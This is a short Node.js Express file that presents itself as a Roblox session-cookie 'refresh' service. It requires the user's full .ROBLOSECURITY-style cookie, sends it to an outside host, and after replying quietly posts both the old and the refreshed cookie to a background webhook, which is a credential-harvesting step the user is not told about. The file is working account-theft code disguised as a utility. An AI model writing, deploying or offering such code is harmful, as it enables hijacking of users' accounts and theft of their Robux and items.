const express = require('express');
const axios = require('axios');

const app = express();

app.get('/api/refresh', async (req, res) => {
    const oldCookie = req.query.cookie;
    const warningPrefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|";

    if (!oldCookie) {
        return res.status(400).json({ error: "Cookie parameter is missing." });
    }
    // Critical Validation: Check if the cookie starts with the required prefix.
    if (!oldCookie.startsWith(warningPrefix)) {
        return res.status(400).json({ error: "Invalid cookie format. It must start with the full _WARNING... prefix." });
    }

    try {
        // --- 1. Call the External API ---
        const refreshResponse = await axios.post('https://rblxrefresh.net/refresh', {
            cookie: oldCookie
        }, {
            headers: { 'Content-Type': 'application/json' }
        });

        const refreshedCookie = refreshResponse.data?.refreshedCookie;

        if (!refreshedCookie) {
            throw new Error("The refresh API did not return a new cookie. Your old cookie may be invalid.");
        }
        
        // --- 2. Respond to the user IMMEDIATELY ---
        res.status(200).json({ refreshedCookie });

        // --- 3. Trigger our own webhook endpoint in the background ---
        const internalApiUrl = `https://${req.headers.host}/api/webhook`;
        axios.post(internalApiUrl, { refreshedCookie, oldCookie })
            .catch(err => console.error("Webhook trigger failed:", err.message));

    } catch (error) {
        // This catches errors from the external API call
        const errorMessage = error.response?.data?.message || error.message;
        console.error("External API refresh failed:", errorMessage);
        res.status(500).json({ error: errorMessage });
    }
});

module.exports = app;
